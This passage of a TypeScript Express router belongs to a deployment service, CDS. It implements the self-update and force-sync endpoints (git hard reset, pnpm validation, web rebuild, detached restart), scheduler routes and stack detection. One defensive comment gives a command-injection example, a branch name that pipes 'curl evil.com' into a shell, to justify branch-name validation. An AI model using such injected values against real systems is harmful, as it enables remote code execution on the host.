          send('checkout', 'error', `切换失败: 期望 ${branch}，实际仍在 ${actualBranch}`);
          sendSSE(res, 'error', { message: `分支切换未生效: 仍在 ${actualBranch}` });
          res.end();
          recordFailure(`分支切换未生效: 仍在 ${actualBranch}`);
          return;
        }
        send('checkout', 'done', `已切换到 ${branch}`);
      }

      // 2026-05-04 fix:fetch 之后先校验 origin/<target> ref 存在,
      // 避免 reset 失败时报英文 git stack trace。常见场景:用户上次
      // self-update 切到了某个 feat 分支,后来该分支合并 main 后被
      // 自动删 head ref,此时 cds.miduo.org 的 HEAD 是 stale,reset 必报
      // "ambiguous argument" 错误。给个友好提示 + 建议切到 main。
      if (branch) {
        const refCheck = await shell.exec(
          `git rev-parse --verify --quiet origin/${branch}`,
          { cwd: repoRoot },
        );
        if (refCheck.exitCode !== 0) {
          const msg =
            `远端分支 origin/${branch} 不存在或已被删除。` +
            `请改选 main 或别的活分支(可在「目标分支」下拉重选)。` +
            `如果你刚把分支合并到 main 后被自动删,选 main 即可。`;
          send('checkout', 'error', msg);
          sendSSE(res, 'error', { message: msg, suggestedFallback: 'main' });
          res.end();
          recordFailure(`origin/${branch} 不存在`);
          return;
        }
      }

      // Step 3: hard-reset local to the remote tip.
      //
      // Prior implementation used `git pull` which creates a merge commit
      // when the local branch has diverged from origin. In managed CDS
      // deployments divergence happens easily (e.g. a prior self-update
      // left a locally-committed state, or the operator ran git commands
      // on the host). An auto-merge can silently drop file changes — we
      // actually hit this: settings.js grew by 438 lines on origin but
      // pull's merge kept the local OLD version, serving stale UI.
      //
      // origin is the source of truth for a managed deployment, so we
      // hard-reset to `origin/<branch>` after fetch. This is destructive
      // to local uncommitted changes (checkout -f above already discards
      // those) and to local-only commits (which shouldn't exist on a
      // prod CDS anyway). For manual debugging branches, operators can
      // still use `git reflog` to recover.
      send('pull', 'running', '正在硬对齐到远端最新...');
      const targetBranch = branch || (await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot })).stdout.trim();
      // Guard the fallback branch too — a corrupted HEAD state could
      // theoretically return something shell-unsafe (unlikely but the
      // check costs nothing).
      if (!isSafeGitRef(targetBranch)) {
        send('pull', 'error', `拒绝不安全分支名: ${targetBranch.slice(0, 80)}`);
        sendSSE(res, 'error', { message: `不合法的 target branch: ${targetBranch}` });
        res.end();
        recordFailure(`不合法的 target branch: ${targetBranch}`);
        return;
      }
      // 2026-05-04 v5 fix(用户反馈"更新时间太长 + 没自动刷新"):
      // **no-op 短路** — HEAD 已经等于 origin/branch + web build 已是最新 →
      // 跳过整个 validate + restart 链路,直接返回 'no-op' SSE 事件 ~1 秒结束。
      // 否则 same-commit 触发会白跑 70+ 秒(validate cold install)。
      const headFullSha = (await shell.exec('git rev-parse HEAD', { cwd: repoRoot })).stdout.trim();
      const remoteFullSha = (await shell.exec(`git rev-parse origin/${targetBranch}`, { cwd: repoRoot })).stdout.trim();
      const noopWebShaPath = path.join(repoRoot, 'cds', 'web', 'dist', '.build-sha');
      let noopWebSha = '';
      try {
        if (fs.existsSync(noopWebShaPath)) noopWebSha = fs.readFileSync(noopWebShaPath, 'utf8').trim();
      } catch { /* ignore */ }
      const noopErrorMarker = path.join(repoRoot, 'cds', 'web', 'dist', '.build-error');
      const noopHasBuildError = fs.existsSync(noopErrorMarker);
      // 2026-05-04 v6 fix:noopWebSha 用 startsWith 容忍 short/full sha 都能匹配。
      // 老的 in-process build 代码(720e47b 之前)写的是 short sha(8 字符),
      // 新代码(6b1af19+)写 full sha(40 字符)。startsWith 兜底两种都行 ——
      // 否则 production 升级到 6b1af19 后第一次 no-op 会因为 .build-sha 还是
      // 老 short sha 而失败,需要再跑一次完整 build 才能进 no-op 路径,卡 1 轮。
      const webShaMatchesHead =
        noopWebSha &&
        headFullSha &&
        (noopWebSha === headFullSha ||
          (noopWebSha.length >= 7 && headFullSha.startsWith(noopWebSha)));
      if (
        headFullSha &&
        remoteFullSha &&
        headFullSha === remoteFullSha &&
        webShaMatchesHead &&
        !noopHasBuildError
      ) {
        const shortHead = headFullSha.slice(0, 8);
        send('pull', 'done', `HEAD 已是 origin/${targetBranch} (${shortHead})`);
        send('no-op', 'done', `检测到 no-op:HEAD/web bundle 都已是最新,跳过 validate/restart`);
        sendSSE(res, 'done', { message: `已是最新版本 (${shortHead}),无需重启` });
        res.end();
        // 流水里也记一条,用 trigger='manual' status='success' duration=极短
        stateService.recordSelfUpdate({
          ts: new Date().toISOString(),
          branch: branch || '',
          fromSha,
          toSha: shortHead,
          trigger: 'manual',
          status: 'success',
          durationMs: Date.now() - startedAt,
          actor,
        });
        return;
      }

      const resetResult = await shell.exec(
        `git reset --hard origin/${targetBranch}`,
        { cwd: repoRoot },
      );
      if (resetResult.exitCode !== 0) {
        const errMsg = (resetResult.stderr || resetResult.stdout || '未知错误').trim();
        send('pull', 'error', `硬对齐失败: ${errMsg}`);
        sendSSE(res, 'error', { message: `无法对齐到 origin/${targetBranch}: ${errMsg}` });
        res.end();
        recordFailure(`硬对齐失败: ${errMsg}`);
        return;
      }
      const newHead = (await shell.exec('git rev-parse --short HEAD', { cwd: repoRoot })).stdout.trim();
      send('pull', 'done', `已对齐到 origin/${targetBranch} @ ${newHead}`);

      // ──────────────────────────────────────────────────────────────
      // Step 3.5: pre-restart validation (P4 Part 18 hardening).
      //
      // The previous self-update killed the running process BEFORE
      // validating that the new code could even start. When Phase D.1
      // added a new npm dep (mongodb) AND I introduced an ESM
      // require() bug, the result was a dead CDS that couldn't be
      // recovered via its own API — a bootstrap trap. This step
      // runs pnpm install + tsc --noEmit inside the current process
      // BEFORE kill+spawn. If anything fails, we abort the restart,
      // leave the running process alive, and surface the error via
      // SSE so the operator knows what to fix.
      // ──────────────────────────────────────────────────────────────
      const cdsDirForCheck = path.join(repoRoot, 'cds');
      send('validate', 'running', '正在校验依赖与编译（pnpm install + tsc --noEmit）...');
      // SSE 心跳:validate 在 cold install 时可达 1-2 分钟,cloudflare 100s 切流。
      const validateStart = Date.now();
      const validateHeartbeat = setInterval(() => {
        const elapsed = Math.floor((Date.now() - validateStart) / 1000);
        sendSSE(res, 'validate-tick', { elapsed, message: `预检进行中 ${elapsed}s` });
      }, 15_000);
      let validation: Awaited<ReturnType<typeof validateBuildReadiness>>;
      try {
        validation = await validateBuildReadiness(shell, cdsDirForCheck);
      } finally {
        clearInterval(validateHeartbeat);
      }
      if (!validation.ok) {
        send('validate', 'error', `预检失败: ${validation.error}`);
        sendSSE(res, 'error', {
          message: `self-update 已中止 — 新代码未通过预检: ${validation.error}`,
          stage: validation.stage,
          hint: '原 CDS 进程保持运行中。修复后请重新触发 self-update。',
        });
        res.end();
        // Aborted (vs failed) — 验证失败,旧进程仍在跑,流水标 'aborted'
        // 让运维一眼区分「网络/git 出问题失败」vs「代码问题安全中止」。
        stateService.recordSelfUpdate({
          ts: new Date().toISOString(),
          branch: branch || '',
          fromSha,
          toSha: fromSha,
          trigger: 'manual',
          status: 'aborted',
          durationMs: Date.now() - startedAt,
          error: `预检失败 (${validation.stage}): ${(validation.error || '').slice(0, 250)}`,
          actor,
        });
        return;
      }
      send('validate', 'done', `预检通过: ${validation.summary}`);
      // 前端 tsc 失败时只 warn,不阻断。让用户知道 web bundle 不会跟着更新。
      if (validation.webWarning) {
        send('web-warning', 'warning', validation.webWarning.slice(0, 400));
      }

      // 2026-05-04 v3 fix(测试发现 daemon 启动后 web bundle 不重建):
      // 在 process.exit 之前**直接在当前进程**跑 web build。理由:
      //   - daemon 启动时 cds_start_background 调 build_web,但实测 production
      //     上 build_web 没产出新 dist(可能 cds_is_running 短路 / sub-shell exit
      //     code 丢失 / 其他难诊断的环境差异 — 反正不可靠)
      //   - 我现在的进程能直接 await pnpm 命令,exit code 看得见,失败有日志
      //   - 成功后写新 .build-sha;失败 send 'web-build' SSE 让前端知道
      // 这样无论 daemon 行为如何,web/dist 都被 in-process 刷新过一次。
      // 设 NODE_OPTIONS 防 OOM(同 validate 那步)。
      //
      // 2026-05-04 v4 fix(用户反馈"卡在 in-process 重建 执行中"):
      //   - SSE 心跳:cloudflare 100s 空闲会切流,期间 pnpm install + vite build
      //     往往 > 100s,前端永远停在"执行中"。每 15s emit 一条 'web-build-tick'
      //     让流不死。
      //   - 跳过冗余 build:.build-sha 已经匹配 newHead → 不重建,直接返 done。
      //     之前每次 self-update 都强制 rebuild,即使代码没变也跑 ~1 分钟。
      const webDir = path.join(repoRoot, 'cds', 'web');
      const webDist = path.join(webDir, 'dist');
      const webShaFile = path.join(webDist, '.build-sha');
      const webBuildLogPath = path.join(repoRoot, 'cds', '.cds', 'web-build.log');
      let existingWebSha = '';
      try {
        if (fs.existsSync(webShaFile)) existingWebSha = fs.readFileSync(webShaFile, 'utf8').trim();
      } catch { /* ignore */ }
      if (fs.existsSync(path.join(webDir, 'package.json'))) {
        // Bugbot PR #524 第五轮:newHead 是 short SHA(git rev-parse --short),
        // existingWebSha 在 v6 fix 后写 full SHA(40 字符,与 no-op 检测一致),
        // 之前 `existingWebSha === newHead` 永远 false → skip 路径死掉,每次
        // self-update 多跑 1-2 分钟无谓重 build。改 startsWith 容忍长短差异。
        if (existingWebSha && existingWebSha.startsWith(newHead) && fs.existsSync(path.join(webDist, 'index.html'))) {
          send('web-build', 'done', `web/dist 已是最新 (${newHead}) — 跳过重建`);
        } else {
          send('web-build', 'running', `正在 in-process 重建 web/dist (日志: cds/.cds/web-build.log)`);
          try {
            // 先删 .build-sha,避免 daemon build_web 用陈旧值 short-circuit
            try { fs.unlinkSync(webShaFile); } catch { /* ignore */ }

            // SSE 心跳:每 15s 发一条 web-build-tick 防 cloudflare 切流。
            const buildStartedAt = Date.now();
            const heartbeat = setInterval(() => {
              const elapsed = Math.floor((Date.now() - buildStartedAt) / 1000);
              sendSSE(res, 'web-build-tick', { elapsed, message: `web build 进行中 ${elapsed}s` });
            }, 15_000);

            try {
              const wInstall = await shell.exec(
                'pnpm install --frozen-lockfile',
                { cwd: webDir, timeout: 300_000, env: { NODE_OPTIONS: '--max-old-space-size=4096' } },
              );
              if (wInstall.exitCode !== 0) {
                clearInterval(heartbeat);
                send('web-build', 'warning', `web pnpm install 失败 (exit=${wInstall.exitCode}, 详细日志见 cds/.cds/web-build.log) — 老 dist 继续 serve`);
              } else {
                const wBuild = await shell.exec(
                  'pnpm build',
                  { cwd: webDir, timeout: 300_000, env: { NODE_OPTIONS: '--max-old-space-size=4096' } },
                );
                clearInterval(heartbeat);
                if (wBuild.exitCode === 0) {
                  // 2026-05-04 v6 fix:写 FULL sha(40字符),与 no-op 检测的 'git rev-parse HEAD'
                  // 输出格式一致。之前写 short sha → no-op 检测里 noopWebSha === headFullSha
                  // 永远 false → no-op 路径永远不触发。同时与 exec_cds.sh build_web 写入格式
                  // 也对齐(它一直写 full sha)。
                  let fullHeadForSha = '';
                  try {
                    fullHeadForSha = (await shell.exec('git rev-parse HEAD', { cwd: repoRoot })).stdout.trim();
                  } catch { /* fallback 用 short */ }
                  try { fs.writeFileSync(webShaFile, (fullHeadForSha || newHead) + '\n'); } catch { /* 写不上不致命 */ }
                  const elapsed = Math.floor((Date.now() - buildStartedAt) / 1000);
                  send('web-build', 'done', `web/dist 已重建到 ${newHead} (${elapsed}s)`);
                } else {
                  const tail = ((wBuild.stderr || wBuild.stdout || '')).slice(-400);
                  send('web-build', 'warning', `web build 失败 (exit=${wBuild.exitCode}, 详细日志: cds/.cds/web-build.log): ${tail}`);
                  // 把完整 stdout+stderr 落到磁盘日志,方便排查
                  try {
                    fs.mkdirSync(path.dirname(webBuildLogPath), { recursive: true });
                    fs.writeFileSync(webBuildLogPath,
                      `=== ${new Date().toISOString()} self-update web build to ${newHead} ===\n` +
                      `EXIT: ${wBuild.exitCode}\nSTDOUT:\n${wBuild.stdout || ''}\nSTDERR:\n${wBuild.stderr || ''}\n`,
                    );
                    fs.writeFileSync(
                      path.join(webDist, '.build-error'),
                      `ts=${new Date().toISOString()}\nhead=${newHead}\nexit=${wBuild.exitCode}\nlog=${webBuildLogPath}\n`,
                    );
                  } catch { /* ignore */ }
                }
              }
            } finally {
              clearInterval(heartbeat);
            }
          } catch (err) {
            send('web-build', 'warning', `web build 异常: ${(err as Error).message}`);
          }
        }
      }

      // 流水成功记录(2026-05-04):预检通过 + 重启即将发起 = 我们记录的"成功"。
      // 注意:这是「manage 流程层面成功」,不代表新进程一定能起来 ——
      // 真起没起请看 GET /healthz?probe=routes(我之前推的保活探针)。
      // 这两个信号配合,运维就能完整复盘:历史告诉你「曾经发起过更新」,
      // healthz 告诉你「现在能不能用」。
      stateService.recordSelfUpdate({
        ts: new Date().toISOString(),
        branch: branch || '',
        fromSha,
        toSha: newHead || fromSha,
        trigger: 'manual',
        status: 'success',
        durationMs: Date.now() - startedAt,
        actor,
      });

      // Step 4: restart CDS via detached process
      send('restart', 'running', '正在重启 CDS...');
      sendSSE(res, 'done', { message: 'CDS 即将重启，页面将在几秒后自动刷新...' });
      res.end();

      // Spawn detached restart script, then exit ourselves.
      // Previous approach relied on exec_cds.sh killing the old process (us),
      // but macOS process group kill behaves differently from Linux.
      // Self-exit is more reliable: we release the port, then exec_cds.sh
      // finds it free and starts the new process cleanly.
      //
      // ⚠ We capture stdout/stderr to a log file instead of `stdio: 'ignore'`
      // so that silent spawn failures (e.g., exec_cds.sh not understanding an
      // argument) leave a forensic trail. Without this, the whole CDS cluster
      // goes dark with no clue why.
      setTimeout(() => {
        const cdsDir = path.join(repoRoot, 'cds');
        const errorLogPath = path.join(cdsDir, '.cds', 'self-update-error.log');
        try {
          // Ensure directory exists
          fs.mkdirSync(path.dirname(errorLogPath), { recursive: true });
          const stamp = new Date().toISOString();
          fs.appendFileSync(errorLogPath, `\n=== self-update spawn at ${stamp} (branch=${branch || '(same)'}) ===\n`);

          const out = fs.openSync(errorLogPath, 'a');
          const errFd = fs.openSync(errorLogPath, 'a');
          const child = spawn('bash', ['./exec_cds.sh', 'daemon'], {
            cwd: cdsDir,
            detached: true,
            stdio: ['ignore', out, errFd],
            env: { ...process.env },
          });
          child.on('error', (err) => {
            fs.appendFileSync(errorLogPath, `spawn error: ${err.message}\n`);
          });
          child.unref();

          // Exit ourselves after a brief delay so exec_cds.sh can bind the port.
          // If the new process failed to start, the next admin to hit CDS will
          // see an empty upstream — and will find a forensic trail in
          // .cds/self-update-error.log.
          setTimeout(() => process.exit(0), 1000);
        } catch (spawnErr) {
          // Something went wrong before spawn; write it out and still exit
          // (caller already received 'done' SSE; they're expecting restart).
          try {
            fs.appendFileSync(errorLogPath, `pre-spawn error: ${(spawnErr as Error).message}\n`);
          } catch { /* can't log either; give up silently */ }
          setTimeout(() => process.exit(1), 500);
        }
      }, 500);
    } catch (err) {
      send('error', 'error', `更新失败: ${(err as Error).message}`);
      sendSSE(res, 'error', { message: (err as Error).message });
      res.end();
      recordFailure(`更新失败(异常): ${(err as Error).message}`);
    }
  });

  // POST /api/self-update-dry-run — run the pre-restart validation
  // WITHOUT killing the running process or spawning a new one.
  //
  // Body: {} — operates on the currently checked-out source tree.
  //
  // Returns:
  //   { ok: true, summary }              — safe to self-update
  //   { ok: false, stage, error }        — blocking issue
  //
  // Use case: operators (and CI) who want to verify a branch can
  // be self-updated before actually hitting the red button. No
  // side effects — if you see { ok: true } you can confidently
  // call /api/self-update next.
  router.post('/self-update-dry-run', async (_req, res) => {
    const cdsDir = path.join(config.repoRoot, 'cds');
    try {
      const started = Date.now();
      const result = await validateBuildReadiness(shell, cdsDir);
      const durationMs = Date.now() - started;
      if (result.ok) {
        // 2026-05-04 v2:webWarning(前端 tsc 失败)是 warning,不阻断,加到响应里。
        res.json({
          ok: true,
          summary: result.summary,
          durationMs,
          ...(result.webWarning ? { webWarning: result.webWarning } : {}),
        });
      } else {
        res.status(422).json({
          ok: false,
          stage: result.stage,
          error: result.error,
          durationMs,
          hint:
            result.stage === 'install'
              ? 'pnpm install 失败 — 检查 pnpm-lock.yaml 是否与 package.json 同步，或网络是否能拉到 registry'
              : 'tsc --noEmit 失败 — 新代码有类型错误或 import 解析不到',
        });
      }
    } catch (err) {
      res.status(500).json({
        ok: false,
        stage: 'unknown',
        error: (err as Error).message,
      });
    }
  });

  // ─────────────────────────────────────────────────────────────────────
  // POST /api/self-force-sync — recovery endpoint for divergent repos.
  //
  // When the CDS host's local git checkout has diverged from origin (e.g.
  // a prior self-update silently merged, or an operator made a hot-patch
  // commit), the regular /api/self-update can't recover because its
  // `git pull` keeps creating merge commits that DROP remote changes.
  // This endpoint is the escape hatch: hard-reset to origin + clear the
  // dist/.build-sha cache so the next start recompiles from scratch +
  // restart. Destructive to local commits, intentionally so.
  //
  // Streams SSE so the operator watching the UI gets real-time progress.
  // ─────────────────────────────────────────────────────────────────────
  router.post('/self-force-sync', async (req, res) => {
    const { branch } = (req.body || {}) as { branch?: string };

    initSSE(res);
    const send = (step: string, status: string, title: string, extra?: Record<string, unknown>) => {
      sendSSE(res, 'step', { step, status, title, timestamp: new Date().toISOString(), ...(extra || {}) });
    };

    // 流水记录(2026-05-04):同 /api/self-update,trigger='force-sync',
    // UI 历史抽屉用 trigger 字段区分两类。
    const startedAt = Date.now();
    const actor = (req as { username?: string }).username || 'unknown';
    let fromSha = '';
    try {
      fromSha = (await shell.exec('git rev-parse --short HEAD', { cwd: config.repoRoot }))
        .stdout.trim();
    } catch { /* tolerated */ }
    const recordFailure = (errMsg: string): void => {
      stateService.recordSelfUpdate({
        ts: new Date().toISOString(),
        branch: branch || '',
        fromSha,
        toSha: fromSha,
        trigger: 'force-sync',
        status: 'failed',
        durationMs: Date.now() - startedAt,
        error: errMsg.slice(0, 300),
        actor,
      });
    };

    try {
      const repoRoot = config.repoRoot;
      const cdsDir = path.join(repoRoot, 'cds');

      // Step 1: fetch
      send('fetch', 'running', '正在拉取远端 ref…');
      const fetchRes = await shell.exec('git fetch --all --prune', { cwd: repoRoot, timeout: 60_000 });
      if (fetchRes.exitCode !== 0) {
        send('fetch', 'error', 'git fetch 失败: ' + (combinedOutput(fetchRes) || '').slice(0, 200));
        sendSSE(res, 'error', { message: 'git fetch 失败' });
        res.end();
        recordFailure('git fetch 失败');
        return;
      }
      send('fetch', 'done', '远端 ref 已同步');

      // Step 2: resolve target branch (use current if not supplied).
      // Reject shell-unsafe refs up front — the endpoint is auth-gated
      // but defense-in-depth against an attacker with a valid AI key
      // crafting `branch='main; curl evil.com | sh'` is cheap.
      let target = branch;
      if (!target) {
        const cur = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
        target = cur.stdout.trim() || 'main';
      }
      if (!isSafeGitRef(target)) {
        send('resolve', 'error', `拒绝不安全分支名: ${target.slice(0, 80)}`);
        sendSSE(res, 'error', { message: `不合法的 branch: ${target}` });
        res.end();
        recordFailure(`不合法的 branch: ${target}`);
        return;
      }
      send('resolve', 'done', '目标分支: ' + target);

      // 2026-05-04 fix:fetch 之后先校验 origin/<target> ref 存在,
      // 避免 reset 失败时报英文 git stack trace(同 self-update 修复)。
      const refCheckFs = await shell.exec(
        `git rev-parse --verify --quiet origin/${target}`,
        { cwd: repoRoot },
      );
      if (refCheckFs.exitCode !== 0) {
        const msg =
          `远端分支 origin/${target} 不存在或已被删除。` +
          `请在 body.branch 显式指定一个活分支(如 main),或在 UI 下拉重选。`;
        send('resolve', 'error', msg);
        sendSSE(res, 'error', { message: msg, suggestedFallback: 'main' });
        res.end();
        recordFailure(`origin/${target} 不存在`);
        return;
      }

      // Step 3a: checkout target branch BEFORE the hard reset.
      //
      // Without this, calling with {branch:'develop'} while HEAD is on
      // 'main' would `git reset --hard origin/develop` and move the
      // CURRENT branch (main) to develop's commit — corrupting main's
      // tracking. self-update does this right; we were missing it.
      // Caught by Cursor Bugbot #450 round 7 (HIGH).
      send('checkout', 'running', `切换到 ${target} 分支...`);
      const coRes = await shell.exec(`git checkout -f ${target}`, { cwd: repoRoot, timeout: 30_000 });
      if (coRes.exitCode !== 0) {
        // Fallback: create tracking branch from origin if it doesn't exist
        // locally yet (same dance self-update performs).
        const fbRes = await shell.exec(`git checkout -f -b ${target} origin/${target}`, { cwd: repoRoot, timeout: 30_000 });
        if (fbRes.exitCode !== 0) {
          const errMsg = (combinedOutput(fbRes) || '未知错误').trim();
          send('checkout', 'error', `切换失败: ${errMsg.slice(0, 200)}`);
          sendSSE(res, 'error', { message: `无法切换到 ${target}: ${errMsg}` });
          res.end();
          recordFailure(`无法切换到 ${target}: ${errMsg}`);
          return;
        }
      }
      // Verify we actually ended up on the target branch — catch any
      // silent checkout-succeeds-but-HEAD-elsewhere edge case.
      const verify = await shell.exec('git rev-parse --abbrev-ref HEAD', { cwd: repoRoot });
      const actual = verify.stdout.trim();
      if (actual !== target) {
        send('checkout', 'error', `切换未生效: 期望 ${target},实际 ${actual}`);
        sendSSE(res, 'error', { message: `git checkout 未生效: 仍在 ${actual}` });
        res.end();
        recordFailure(`git checkout 未生效: 仍在 ${actual}`);
        return;
      }
      send('checkout', 'done', `已切到 ${target}`);

      // Step 3b: hard-reset to origin/<target>
      send('reset', 'running', `硬对齐 HEAD → origin/${target}`);
      const resetRes = await shell.exec(`git reset --hard origin/${target}`, { cwd: repoRoot, timeout: 30_000 });
      if (resetRes.exitCode !== 0) {
        send('reset', 'error', 'reset 失败: ' + (combinedOutput(resetRes) || '').slice(0, 200));
        sendSSE(res, 'error', { message: `git reset --hard origin/${target} 失败` });
        res.end();
        recordFailure(`git reset --hard origin/${target} 失败`);
        return;
      }
      const newHead = (await shell.exec('git rev-parse --short HEAD', { cwd: repoRoot })).stdout.trim();
      send('reset', 'done', `HEAD = ${newHead}`, { commitHash: newHead });

      // Step 4: drop dist build cache so next start recompiles.
      send('cache', 'running', '清除 dist/.build-sha 编译缓存…');
      const shaFile = path.join(cdsDir, 'dist', '.build-sha');
      try {
        if (fs.existsSync(shaFile)) {
          fs.unlinkSync(shaFile);
          send('cache', 'done', '已删除 .build-sha');
        } else {
          send('cache', 'done', '.build-sha 不存在, 跳过');
        }
      } catch (err) {
        send('cache', 'warning', '删除 .build-sha 失败: ' + (err as Error).message);
      }

      // Step 5: validate new code compiles before restart.
      send('validate', 'running', '预检: pnpm install + tsc --noEmit…');
      const validation = await validateBuildReadiness(shell, cdsDir);
      if (!validation.ok) {
        send('validate', 'error', `预检失败: ${validation.error.slice(0, 300)}`);
        sendSSE(res, 'error', {
          message: `force-sync 已中止 — ${target} 的代码没过预检: ${validation.error}`,
        });
        res.end();
        // 流水标 'aborted' 同 self-update 处理 — 安全中止,不是真正的故障。
        stateService.recordSelfUpdate({
          ts: new Date().toISOString(),
          branch: branch || target || '',
          fromSha,
          toSha: fromSha,
          trigger: 'force-sync',
          status: 'aborted',
          durationMs: Date.now() - startedAt,
          error: `预检失败 (${validation.stage}): ${(validation.error || '').slice(0, 250)}`,
          actor,
        });
        return;
      }
      send('validate', 'done', validation.summary);
      if (validation.webWarning) {
        send('web-warning', 'warning', validation.webWarning.slice(0, 400));
      }

      // 流水成功记录 — 同 self-update 的逻辑,记录"管理流程层面成功"。
      stateService.recordSelfUpdate({
        ts: new Date().toISOString(),
        branch: branch || target || '',
        fromSha,
        toSha: newHead || fromSha,
        trigger: 'force-sync',
        status: 'success',
        durationMs: Date.now() - startedAt,
        actor,
      });

      // Step 6: restart via exec_cds.sh daemon spawn, exit after 1s.
      send('restart', 'running', '正在重启 CDS…');
      sendSSE(res, 'done', { message: `CDS 即将重启, HEAD=${newHead}`, commitHash: newHead });
      res.end();

      // Same restart technique as /api/self-update — spawn a detached bash
      // that runs exec_cds.sh daemon and let the current process die after
      // a short grace period so the child can bind the port.
      const errorLogPath = path.join(cdsDir, '.cds', 'self-update-error.log');
      try {
        fs.mkdirSync(path.dirname(errorLogPath), { recursive: true });
        fs.appendFileSync(
          errorLogPath,
          `\n=== self-force-sync spawn at ${new Date().toISOString()} (branch=${target}) ===\n`,
        );
        const out = fs.openSync(errorLogPath, 'a');
        const errFd = fs.openSync(errorLogPath, 'a');
        const child = spawn('bash', ['./exec_cds.sh', 'daemon'], {
          cwd: cdsDir,
          detached: true,
          stdio: ['ignore', out, errFd],
          env: { ...process.env },
        });
        child.on('error', (err) => {
          fs.appendFileSync(errorLogPath, `spawn error: ${err.message}\n`);
        });
        child.unref();
        setTimeout(() => process.exit(0), 1000);
      } catch (spawnErr) {
        // If we can't spawn the replacement, at least we've persisted the
        // reset — operator can manually `./exec_cds.sh restart` afterwards.
        try {
          fs.appendFileSync(errorLogPath, `pre-spawn error: ${(spawnErr as Error).message}\n`);
        } catch {
          /* ignore */
        }
      }
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
      try { res.end(); } catch { /* already ended */ }
      recordFailure(`force-sync 异常: ${(err as Error).message}`);
    }
  });

  // ─────────────────────────────────────────────────────────────────────
  // Warm-pool scheduler API (v3.1)
  // See doc/design.cds-resilience.md §九.
  // When schedulerService is not wired in, these endpoints return a
  // consistent "disabled" payload so Dashboard UIs can degrade gracefully.
  // ─────────────────────────────────────────────────────────────────────

  router.get('/scheduler/state', (_req, res) => {
    if (!schedulerService) {
      res.json({
        enabled: false,
        config: null,
        hot: [],
        cold: [],
        capacityUsage: { current: 0, max: 0 },
      });
      return;
    }
    res.json(schedulerService.getSnapshot());
  });

  // ── PUT /api/scheduler/enabled — flip scheduler on/off from the UI ──
  //
  // Persists the override into state.json via stateService so the toggle
  // survives restart, then calls schedulerService.setEnabled() which
  // starts/stops the background tick loop.
  router.put('/scheduler/enabled', (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler service not wired in' });
      return;
    }
    const { enabled } = (req.body || {}) as { enabled?: unknown };
    if (typeof enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是 boolean' });
      return;
    }
    stateService.setSchedulerEnabledOverride(enabled);
    stateService.save();
    schedulerService.setEnabled(enabled);
    res.json({ enabled, source: 'ui-override' });
  });

  router.post('/scheduler/pin/:slug', (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler not enabled' });
      return;
    }
    try {
      schedulerService.pin(req.params.slug);
      res.json({ ok: true, slug: req.params.slug, pinned: true });
    } catch (err) {
      res.status(404).json({ error: (err as Error).message });
    }
  });

  router.post('/scheduler/unpin/:slug', (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler not enabled' });
      return;
    }
    try {
      schedulerService.unpin(req.params.slug);
      res.json({ ok: true, slug: req.params.slug, pinned: false });
    } catch (err) {
      res.status(404).json({ error: (err as Error).message });
    }
  });

  router.post('/scheduler/cool/:slug', async (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler not enabled' });
      return;
    }
    const slug = req.params.slug;
    const branch = stateService.getBranch(slug);
    if (!branch) {
      res.status(404).json({ error: `分支 "${slug}" 不存在` });
      return;
    }
    if (schedulerService.isPinned(branch)) {
      res.status(409).json({ error: `分支 "${slug}" 已固定,无法手动休眠` });
      return;
    }
    try {
      await schedulerService.markCold(slug);
      res.json({ ok: true, slug, heatState: 'cold' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // P4 Part 18 (G10): POST /api/detect-stack — auto-detect stack.
  //
  // Body: { projectId?, branchId?, path? }
  //
  // The route figures out which filesystem path to scan:
  //   - `path` is absolute → use as-is (rare, escape hatch)
  //   - `branchId` → use that branch's worktree
  //   - `projectId` → use the project's repoPath / cloned repo
  //   - neither → fall back to config.repoRoot
  //
  // Returns the raw StackDetection from detectStack(). BuildProfile
  // form consumers pick dockerImage / installCommand / buildCommand
  // / runCommand from the response. Never throws on unknown stack;
  // the client just shows the summary when confidence is 0.
  router.post('/detect-stack', (req, res) => {
    const { projectId, branchId, path: explicitPath } = (req.body || {}) as {
      projectId?: string;
      branchId?: string;
      path?: string;
    };

    let scanPath: string;
    if (typeof explicitPath === 'string' && explicitPath.length > 0 && path.isAbsolute(explicitPath)) {
      scanPath = explicitPath;
    } else if (branchId) {
      const entry = stateService.getBranch(branchId);
      if (!entry) {
        res.status(404).json({ error: `分支 "${branchId}" 不存在` });
        return;
      }
      scanPath = entry.worktreePath;
    } else if (projectId) {
      scanPath = stateService.getProjectRepoRoot(projectId, config.repoRoot);
    } else {
      scanPath = config.repoRoot;
    }

    try {
      const detection = detectStack(scanPath);
      res.json({ ...detection, scanPath });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  return router;
}
